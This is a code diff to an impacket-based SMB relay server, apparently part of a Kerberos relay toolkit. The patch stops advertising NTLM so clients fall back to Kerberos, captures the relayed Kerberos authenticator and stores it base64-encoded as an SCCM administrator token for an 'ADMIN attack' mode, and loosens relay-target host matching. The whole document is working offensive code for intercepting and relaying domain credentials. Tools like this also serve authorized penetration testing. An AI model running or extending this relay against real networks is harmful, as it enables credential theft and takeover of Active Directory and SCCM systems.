@@ -28,6 +28,8 @@ import calendar
 import random
 import string
 import socket
+import base64
+import unicodedata
 
 from binascii import hexlify
 from impacket import smb, ntlm, LOG, smb3
@@ -41,6 +43,7 @@ from impacket.smbserver import getFileTime
 from pyasn1.codec.der import decoder, encoder
 from lib.utils.kerberos import get_kerberos_loot, get_auth_data
 from lib.utils.spnego import GSSAPIHeader_SPNEGO_Init2, GSSAPIHeader_SPNEGO_Init, MechTypes, MechType, TypesMech, NegTokenResp, NegResult, NegotiationToken
+from lib.utils.norm import normalize_host
 
 class SMBRelayServer(Thread):
     def __init__(self,config):
@@ -155,8 +158,8 @@ class SMBRelayServer(Thread):
         blob = GSSAPIHeader_SPNEGO_Init2()
         blob['tokenOid'] = '1.3.6.1.5.5.2'
         blob['innerContextToken']['mechTypes'].extend([MechType(TypesMech['KRB5 - Kerberos 5']),
-                                                       MechType(TypesMech['MS KRB5 - Microsoft Kerberos 5']),
-                                                       MechType(TypesMech['NTLMSSP - Microsoft NTLM Security Support Provider'])])
+                                                       MechType(TypesMech['MS KRB5 - Microsoft Kerberos 5'])])
+                                                       #MechType(TypesMech['NTLMSSP - Microsoft NTLM Security Support Provider'])])
         blob['innerContextToken']['negHints']['hintName'] = "not_defined_in_RFC4178@please_ignore"
         respSMBCommand['Buffer'] = encoder.encode(blob)
 
@@ -216,7 +219,9 @@ class SMBRelayServer(Thread):
                     else:
 
                         # This is Kerberos, we can do something with this
+                       
                         try:
+                         
                             if self.config.mode == 'EXPORT':
                                 authdata = get_kerberos_loot(securityBlob, self.config)
                             
@@ -228,6 +233,10 @@ class SMBRelayServer(Thread):
 
                             if self.config.mode == 'RELAY':
                                 authdata = get_auth_data(securityBlob, self.config)
+                                if self.config.isADMINAttack:
+                                     negotiate = base64.b64encode(authdata['krbauth']).decode("ascii")
+                                     self.config.setSCCMAdminToken(negotiate)
+
                                 self.do_relay(authdata)
 
                             # This ignores all signing stuff
@@ -575,7 +584,7 @@ class SMBRelayServer(Thread):
         sclass, host = authdata['service'].split('/')
         for target in self.config.target.originalTargets:
             parsed_target = target
-            if host.lower() in parsed_target.hostname.lower():
+            if normalize_host(host) in normalize_host(parsed_target.hostname):
                 # Found a target with the same SPN
                 client = self.config.protocolClients[target.scheme.upper()](self.config, parsed_target)
                 if not client.initConnection(authdata, self.config.dcip):
